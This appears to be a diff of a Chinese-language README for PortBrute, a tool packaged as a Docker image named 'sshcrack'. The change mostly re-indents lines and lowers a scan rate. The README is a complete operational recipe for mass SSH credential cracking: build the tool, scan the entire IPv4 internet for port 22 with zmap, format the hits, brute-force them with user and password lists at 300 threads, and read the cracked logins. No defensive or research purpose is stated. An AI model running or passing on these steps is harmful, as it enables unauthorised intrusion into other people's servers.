@@ -29,21 +29,21 @@
 
     
 ### 安装
-apt update && apt install docker.io -y && git clone https://github.com/qq1521575701/PortBrute.git && cd PortBrute && docker build -t sshcrack . && docker run -itd --name sshcrack --network host sshcrack:latest && docker exec -it sshcrack /bin/bash
+	apt update && apt install docker.io -y && git clone https://github.com/qq1521575701/PortBrute.git && cd PortBrute && docker build -t sshcrack . && docker run -itd --name sshcrack --network host sshcrack:latest && docker exec -it sshcrack /bin/bash
 
 ### 扫描
-nohup zmap -p 22 0.0.0.0/0 -N 5000 -o ssh.txt > zmap.log &
+	nohup zmap -p 22 0.0.0.0/0 -N 500 -o ssh.txt > zmap.log &
 
 ### 为ip添加端口
-sed -i 's/$/:22|SSH/' ssh.txt
+	sed -i 's/$/:22|SSH/' ssh.txt
 
 ### 开始
-nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 300 -u user.txt > PortBruteLinux.log &
+	nohup ./PortBruteLinux -f ssh.txt -p pass.txt -t 300 -u user.txt > PortBruteLinux.log &
 
-tail -f PortBruteLinux.log
+	tail -f PortBruteLinux.log
 
-docker exec -it sshcrack tail -f PortBruteLinux.log
+	docker exec -it sshcrack tail -f PortBruteLinux.log
 ### 查看结果
-cat res.txt
+	cat res.txt
 
-docker exec -it sshcrack cat res.txt
+	docker exec -it sshcrack cat res.txt
